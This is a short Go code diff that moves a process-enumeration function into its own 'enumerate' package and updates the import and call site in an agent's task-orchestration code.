@@ -4,7 +4,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"log"
-	"numinon_shadow/internal/agent/command"
+	"numinon_shadow/internal/agent/command/enumerate"
 	"numinon_shadow/internal/models"
 	"strings"
 )
@@ -30,7 +30,7 @@ func (a *Agent) orchestrateEnumerate(task models.ServerTaskResponse) models.Agen
 		task.TaskID, args.ProcessName)
 
 	// Call the "doer" function
-	enumerateResult, err := command.DoEnumerate(args)
+	enumerateResult, err := enumerate.DoEnumerate(args)
 
 	// Prepare the final TaskResult
 	finalResult := models.AgentTaskResult{
